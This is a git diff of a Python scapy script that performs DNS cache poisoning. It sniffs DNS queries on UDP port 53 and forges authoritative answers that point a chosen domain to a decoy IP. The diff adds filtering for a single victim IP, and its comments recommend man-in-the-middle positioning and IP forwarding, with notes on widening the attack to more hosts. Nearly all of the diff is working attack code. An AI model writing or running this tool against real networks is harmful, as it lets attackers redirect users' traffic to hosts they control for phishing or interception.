@@ -4,6 +4,9 @@ from scapy.all import send, sniff
 import signal
 import ipaddress
 
+# This script will use a DNS poison on the target IP. It could
+# be modified to DNS poison more than only 1
+
 # Timing: DNS queries and responses are sensitive to timing.
 # If the spoofed response arrives after the legitimate DNS response, it may be ignored.
 # Running the script on a high-performance setup or using a preconfigured MITM setup
@@ -12,8 +15,9 @@ import ipaddress
 # Employ the MitM to improve the timing reliability. Also as an extra add can be
 # to have your machine be used as a Gateway by allowing IP forwarding
 
-TARGET_DOMAIN=""  ## Global holder to set the target domain to redirect resolv from
-FAKE_IP=""  ## Global holder to set the IP to redirect to, preferably a decoy host
+VICTIM_IP=""
+SPOOF_DOMAIN=""  ## Global holder to set the target domain to redirect resolv from
+SPOOF_IP=""  ## Global holder to set the IP to redirect to, preferably a decoy host
 
 def is_valid_ip(target):
   try:
@@ -28,29 +32,34 @@ def process_packet(packet):
     dns_query = packet[DNSQR].qname.decode()
     print(f"Intercepted DNS request for: {dns_query}")
 
-    # Check if the query matches the target domain
-    if TARGET_DOMAIN in dns_query:
-      # Craft a spoofed DNS response
-      spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
-                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
-                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                              an=DNSRR(rrname=dns_query, ttl=10, rdata=FAKE_IP))
+
+    # This condition could be changed to allow all but our machine's IP if we want to poison more
+    if packet[IP].src == VICTIM_IP:
+      # Check if the query matches the target domain
+      if SPOOF_DOMAIN in dns_query:
+        # Craft a spoofed DNS response
+        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst) / \
+                            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
+                            DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
+                                an=DNSRR(rrname=dns_query, ttl=10, rdata=SPOOF_IP))
 
       # Send the spoofed packet
-      send(spoofed_packet, verbose=0)
-      print(f"Sent spoofed response: {dns_query} -> {FAKE_IP}")
+        send(spoofed_packet, verbose=0)
+        print(f"Sent spoofed response: {dns_query} -> {SPOOF_IP}")
 
-def main(in_target_domain, in_fake_ip):
-  global TARGET_DOMAIN
-  global FAKE_IP
+def main(in_victim_ip, in_spoof_domain, in_spoof_ip):
+  global VICTIM_IP
+  global SPOOF_DOMAIN
+  global SPOOF_IP
 
-  TARGET_DOMAIN = in_target_domain
-  FAKE_IP = in_fake_ip
+  VICTIM_IP = in_victim_ip
+  SPOOF_DOMAIN = in_spoof_domain
+  SPOOF_IP = in_spoof_ip
   # Sniff DNS requests and apply the process_packet function
   ## Oh boy ...
   signal.signal(signal.SIGINT, signal.SIG_IGN)
-  print(f"Starting DNS poisoning on domain: {TARGET_DOMAIN}")
+  print(f"Starting DNS poisoning on domain: {SPOOF_DOMAIN}")
   sniff(filter="udp port 53", prn=process_packet)
 
 if __name__ == "__main__":
-    main()
+    main(in_victim_ip="", in_spoof_domain="", in_spoof_ip="")
